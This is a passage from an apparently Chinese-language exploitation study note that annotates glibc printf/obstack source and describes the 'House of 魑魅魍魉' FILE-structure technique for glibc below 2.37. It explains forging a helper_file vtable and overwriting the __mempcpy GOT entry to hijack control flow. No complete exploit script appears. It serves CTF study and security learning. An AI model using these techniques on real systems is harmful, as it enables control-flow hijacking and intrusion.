<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>__printf_buffer_as_file_commit</span> <span class=p>(</span><span class=k>struct</span> <span class=n>__printf_buffer_as_file</span> <span class=o>*</span><span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>assert</span> <span class=p>(</span><span class=n>file</span><span class=o>-&gt;</span><span class=n>stream</span><span class=p>.</span><span class=n>_IO_write_ptr</span> <span class=o>&gt;=</span> <span class=n>file</span><span class=o>-&gt;</span><span class=n>next</span><span class=o>-&gt;</span><span class=n>write_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>assert</span> <span class=p>(</span><span class=n>file</span><span class=o>-&gt;</span><span class=n>stream</span><span class=p>.</span><span class=n>_IO_write_ptr</span> <span class=o>&lt;=</span> <span class=n>file</span><span class=o>-&gt;</span><span class=n>next</span><span class=o>-&gt;</span><span class=n>write_end</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>assert</span> <span class=p>(</span><span class=n>file</span><span class=o>-&gt;</span><span class=n>stream</span><span class=p>.</span><span class=n>_IO_write_base</span> <span class=o>==</span> <span class=n>file</span><span class=o>-&gt;</span><span class=n>next</span><span class=o>-&gt;</span><span class=n>write_base</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>assert</span> <span class=p>(</span><span class=n>file</span><span class=o>-&gt;</span><span class=n>stream</span><span class=p>.</span><span class=n>_IO_write_end</span> <span class=o>==</span> <span class=n>file</span><span class=o>-&gt;</span><span class=n>next</span><span class=o>-&gt;</span><span class=n>write_end</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>file</span><span class=o>-&gt;</span><span class=n>next</span><span class=o>-&gt;</span><span class=n>write_ptr</span> <span class=o>=</span> <span class=n>file</span><span class=o>-&gt;</span><span class=n>stream</span><span class=p>.</span><span class=n>_IO_write_ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>进入<code>__printf_buffer_flush</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define Xprintf(n) __printf_##n
</span></span></span><span class=line><span class=cl><span class=cp>#define Xprintf_buffer_flush Xprintf (buffer_flush)
</span></span></span><span class=line><span class=cl><span class=cp>#define Xprintf_buffer Xprintf (buffer)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>Xprintf_buffer_flush</span> <span class=p>(</span><span class=k>struct</span> <span class=n>Xprintf_buffer</span> <span class=o>*</span><span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nf>__glibc_unlikely</span> <span class=p>(</span><span class=nf>Xprintf_buffer_has_failed</span> <span class=p>(</span><span class=n>buf</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>Xprintf</span> <span class=p>(</span><span class=n>buffer_do_flush</span><span class=p>)</span> <span class=p>(</span><span class=n>buf</span><span class=p>);</span> <span class=c1>// 此处调用__printf_buffer_do_flush(buf)
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p><code>__printf_buffer_do_flush</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>__printf_buffer_do_flush</span> <span class=p>(</span><span class=k>struct</span> <span class=n>__printf_buffer</span> <span class=o>*</span><span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>switch</span> <span class=p>(</span><span class=n>buf</span><span class=o>-&gt;</span><span class=n>mode</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>__printf_buffer_mode_failed</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>__printf_buffer_mode_sprintf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>__printf_buffer_mode_snprintf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=nf>__printf_buffer_flush_snprintf</span> <span class=p>((</span><span class=k>struct</span> <span class=n>__printf_buffer_snprintf</span> <span class=o>*</span><span class=p>)</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>__printf_buffer_mode_sprintf_chk</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=nf>__chk_fail</span> <span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>__printf_buffer_mode_to_file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=nf>__printf_buffer_flush_to_file</span> <span class=p>((</span><span class=k>struct</span> <span class=n>__printf_buffer_to_file</span> <span class=o>*</span><span class=p>)</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>__printf_buffer_mode_asprintf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=nf>__printf_buffer_flush_asprintf</span> <span class=p>((</span><span class=k>struct</span> <span class=n>__printf_buffer_asprintf</span> <span class=o>*</span><span class=p>)</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>__printf_buffer_mode_dprintf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=nf>__printf_buffer_flush_dprintf</span> <span class=p>((</span><span class=k>struct</span> <span class=n>__printf_buffer_dprintf</span> <span class=o>*</span><span class=p>)</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>__printf_buffer_mode_strfmon</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=nf>__set_errno</span> <span class=p>(</span><span class=n>E2BIG</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>__printf_buffer_mark_failed</span> <span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>__printf_buffer_mode_fp</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=nf>__printf_buffer_flush_fp</span> <span class=p>((</span><span class=k>struct</span> <span class=n>__printf_buffer_fp</span> <span class=o>*</span><span class=p>)</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>__printf_buffer_mode_fp_to_wide</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=nf>__printf_buffer_flush_fp_to_wide</span>
</span></span><span class=line><span class=cl>        <span class=p>((</span><span class=k>struct</span> <span class=n>__printf_buffer_fp_to_wide</span> <span class=o>*</span><span class=p>)</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>__printf_buffer_mode_fphex_to_wide</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=nf>__printf_buffer_flush_fphex_to_wide</span>
</span></span><span class=line><span class=cl>        <span class=p>((</span><span class=k>struct</span> <span class=n>__printf_buffer_fphex_to_wide</span> <span class=o>*</span><span class=p>)</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>__printf_buffer_mode_obstack</span><span class=p>:</span> <span class=c1>// 进入该 case
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=nf>__printf_buffer_flush_obstack</span> <span class=p>((</span><span class=k>struct</span> <span class=n>__printf_buffer_obstack</span> <span class=o>*</span><span class=p>)</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nf>__builtin_trap</span> <span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>调用<code>__printf_buffer_flush_obstack</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>__printf_buffer_flush_obstack</span> <span class=p>(</span><span class=k>struct</span> <span class=n>__printf_buffer_obstack</span> <span class=o>*</span><span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>buf</span><span class=o>-&gt;</span><span class=n>base</span><span class=p>.</span><span class=n>written</span> <span class=o>+=</span> <span class=n>buf</span><span class=o>-&gt;</span><span class=n>base</span><span class=p>.</span><span class=n>write_ptr</span> <span class=o>-</span> <span class=n>buf</span><span class=o>-&gt;</span><span class=n>base</span><span class=p>.</span><span class=n>write_base</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>buf</span><span class=o>-&gt;</span><span class=n>base</span><span class=p>.</span><span class=n>write_ptr</span> <span class=o>==</span> <span class=o>&amp;</span><span class=n>buf</span><span class=o>-&gt;</span><span class=n>ch</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>obstack_1grow</span> <span class=p>(</span><span class=n>buf</span><span class=o>-&gt;</span><span class=n>obstack</span><span class=p>,</span> <span class=n>buf</span><span class=o>-&gt;</span><span class=n>ch</span><span class=p>);</span> <span class=c1>// 调用该函数
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=c1>// 后续IO利用调用链为
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=c1>// _obstack_newchunk (__o, 1);
</span></span></span><span class=line><span class=cl><span class=c1></span>			<span class=c1>// new_chunk = CALL_CHUNKFUN (h, new_size);
</span></span></span><span class=line><span class=cl><span class=c1></span>				<span class=c1>// (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))
</span></span></span></code></pre></div></div><p><strong>利用</strong></p><img src=/img/pwn_note.zh-cn.assets/image-20250127213018398.png alt=图片无法加载><h4 id=house-of-魑魅魍魉>House of 魑魅魍魉</h4><ul><li>&lt;glibc-2.37</li><li><code>_IO_helper_jumps</code> ，根据 COMPILE_WPRINTF 不同而生成不同的跳转表，实际程序中有 2 个表</li><li><code>COMPILE_WPRINTF == 0</code> 先生成，<code>COMPILE_WPRINTF == 1</code> 后生成</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#ifdef COMPILE_WPRINTF
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>static</span> <span class=k>const</span> <span class=k>struct</span> <span class=n>_IO_jump_t</span> <span class=n>_IO_helper_jumps</span> <span class=n>libio_vtable</span> <span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>JUMP_INIT_DUMMY</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>finish</span><span class=p>,</span> <span class=n>_IO_wdefault_finish</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>overflow</span><span class=p>,</span> <span class=n>_IO_helper_overflow</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>underflow</span><span class=p>,</span> <span class=n>_IO_default_underflow</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>uflow</span><span class=p>,</span> <span class=n>_IO_default_uflow</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>pbackfail</span><span class=p>,</span> <span class=p>(</span><span class=n>_IO_pbackfail_t</span><span class=p>)</span> <span class=n>_IO_wdefault_pbackfail</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>xsputn</span><span class=p>,</span> <span class=n>_IO_wdefault_xsputn</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>xsgetn</span><span class=p>,</span> <span class=n>_IO_wdefault_xsgetn</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>seekoff</span><span class=p>,</span> <span class=n>_IO_default_seekoff</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>seekpos</span><span class=p>,</span> <span class=n>_IO_default_seekpos</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>setbuf</span><span class=p>,</span> <span class=n>_IO_default_setbuf</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>sync</span><span class=p>,</span> <span class=n>_IO_default_sync</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>doallocate</span><span class=p>,</span> <span class=n>_IO_wdefault_doallocate</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>read</span><span class=p>,</span> <span class=n>_IO_default_read</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>write</span><span class=p>,</span> <span class=n>_IO_default_write</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>seek</span><span class=p>,</span> <span class=n>_IO_default_seek</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>close</span><span class=p>,</span> <span class=n>_IO_default_close</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>stat</span><span class=p>,</span> <span class=n>_IO_default_stat</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=cp>#else
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>static</span> <span class=k>const</span> <span class=k>struct</span> <span class=n>_IO_jump_t</span> <span class=n>_IO_helper_jumps</span> <span class=n>libio_vtable</span> <span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>JUMP_INIT_DUMMY</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>finish</span><span class=p>,</span> <span class=n>_IO_default_finish</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>overflow</span><span class=p>,</span> <span class=n>_IO_helper_overflow</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>underflow</span><span class=p>,</span> <span class=n>_IO_default_underflow</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>uflow</span><span class=p>,</span> <span class=n>_IO_default_uflow</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>pbackfail</span><span class=p>,</span> <span class=n>_IO_default_pbackfail</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>xsputn</span><span class=p>,</span> <span class=n>_IO_default_xsputn</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>xsgetn</span><span class=p>,</span> <span class=n>_IO_default_xsgetn</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>seekoff</span><span class=p>,</span> <span class=n>_IO_default_seekoff</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>seekpos</span><span class=p>,</span> <span class=n>_IO_default_seekpos</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>setbuf</span><span class=p>,</span> <span class=n>_IO_default_setbuf</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>sync</span><span class=p>,</span> <span class=n>_IO_default_sync</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>doallocate</span><span class=p>,</span> <span class=n>_IO_default_doallocate</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>read</span><span class=p>,</span> <span class=n>_IO_default_read</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>write</span><span class=p>,</span> <span class=n>_IO_default_write</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>seek</span><span class=p>,</span> <span class=n>_IO_default_seek</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>close</span><span class=p>,</span> <span class=n>_IO_default_close</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span> <span class=p>(</span><span class=n>stat</span><span class=p>,</span> <span class=n>_IO_default_stat</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=cp>#endif</span></span></span></code></pre></div></div><p>不同 <code>COMPILE_WPRINTF</code> 对应 <code>helper_file</code> 也不同，区别在于是否需要伪造 <code>struct _IO_wide_data _wide_data;</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>helper_file</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>_IO_FILE_plus</span> <span class=n>_f</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#ifdef COMPILE_WPRINTF
</span></span></span><span class=line><span class=cl><span class=cp></span>	<span class=k>struct</span> <span class=n>_IO_wide_data</span> <span class=n>_wide_data</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>	<span class=n>FILE</span> <span class=o>*</span><span class=n>_put_stream</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#ifdef _IO_MTSAFE_IO
</span></span></span><span class=line><span class=cl><span class=cp></span>	<span class=n>_IO_lock_t</span> <span class=n>lock</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=p>};</span></span></span></code></pre></div></div><p><strong>原理</strong></p><ul><li>利用 <code>COMPILE_WPRINTF == 1</code> 的 <code>_IO_helper_overflow</code> ，攻击过程中该函数用于控制 <code>_IO_default_xsputn</code> 的三个参数</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>_IO_helper_overflow</span> <span class=p>(</span><span class=n>FILE</span> <span class=o>*</span><span class=n>s</span><span class=p>,</span> <span class=kt>int</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>FILE</span> <span class=o>*</span><span class=n>target</span> <span class=o>=</span> <span class=p>((</span><span class=k>struct</span> <span class=n>helper_file</span><span class=o>*</span><span class=p>)</span> <span class=n>s</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>_put_stream</span><span class=p>;</span> <span class=c1>// 第一个参数
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#ifdef COMPILE_WPRINTF
</span></span></span><span class=line><span class=cl><span class=cp></span>  <span class=c1>// 第三个参数
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>used</span> <span class=o>=</span> <span class=n>s</span><span class=o>-&gt;</span><span class=n>_wide_data</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>-</span> <span class=n>s</span><span class=o>-&gt;</span><span class=n>_wide_data</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>used</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=c1>// 利用这个链，三个参数都可控
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kt>size_t</span> <span class=n>written</span> <span class=o>=</span> <span class=nf>_IO_sputn</span> <span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=n>s</span><span class=o>-&gt;</span><span class=n>_wide_data</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>,</span> <span class=n>used</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>written</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>||</span> <span class=n>written</span> <span class=o>==</span> <span class=n>WEOF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>WEOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=nf>__wmemmove</span> <span class=p>(</span><span class=n>s</span><span class=o>-&gt;</span><span class=n>_wide_data</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>,</span>
</span></span><span class=line><span class=cl>          <span class=n>s</span><span class=o>-&gt;</span><span class=n>_wide_data</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span> <span class=o>+</span> <span class=n>written</span><span class=p>,</span>
</span></span><span class=line><span class=cl>          <span class=n>used</span> <span class=o>-</span> <span class=n>written</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>s</span><span class=o>-&gt;</span><span class=n>_wide_data</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>-=</span> <span class=n>written</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>#else
</span></span></span><span class=line><span class=cl><span class=cp></span>    <span class=c1>// 如果使用这条链，_IO_write_ptr 将处于 largebin 的 bk_size 指针处
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>used</span> <span class=o>=</span> <span class=n>s</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>-</span> <span class=n>s</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>used</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=kt>size_t</span> <span class=n>written</span> <span class=o>=</span> <span class=nf>_IO_sputn</span> <span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=n>s</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>,</span> <span class=n>used</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>written</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>||</span> <span class=n>written</span> <span class=o>==</span> <span class=n>EOF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>EOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=nf>memmove</span> <span class=p>(</span><span class=n>s</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>,</span> <span class=n>s</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span> <span class=o>+</span> <span class=n>written</span><span class=p>,</span>
</span></span><span class=line><span class=cl>           <span class=n>used</span> <span class=o>-</span> <span class=n>written</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>s</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>-=</span> <span class=n>written</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>  <span class=k>return</span> <span class=nf>PUTC</span> <span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><ul><li>修改 <code>((struct helper_file*) s)->_put_stream</code> 的 <code>vtable</code> 指向 <code>_IO_str_jumps</code> ，使其调用 <code>_IO_default_xsputn</code> 函数</li><li><code>_IO_default_xsputn</code> 函数内要绕过的内容较多，其攻击过程中两次调用 <code>__mempcpy</code> ：<ul><li>第一次利用任意地址写修改 <code>__mempcpy</code> 对应的 got 表中的值</li><li>第二次调用 <code>__mempcpy</code> 劫持程序执行流</li></ul></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>size_t</span> <span class=nf>_IO_default_xsputn</span> <span class=p>(</span><span class=n>FILE</span> <span class=o>*</span><span class=n>f</span><span class=p>,</span> <span class=k>const</span> <span class=kt>void</span> <span class=o>*</span><span class=n>data</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
